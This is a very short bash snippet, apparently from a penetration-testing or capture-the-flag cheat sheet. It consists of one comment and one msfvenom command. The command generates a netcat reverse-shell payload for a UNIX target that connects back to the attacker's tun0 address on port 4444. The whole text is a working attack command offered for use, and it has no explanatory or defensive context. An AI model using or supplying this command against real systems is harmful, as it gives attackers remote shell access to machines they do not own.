
```bash
# Create a reverse shell with a target UNIX
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
```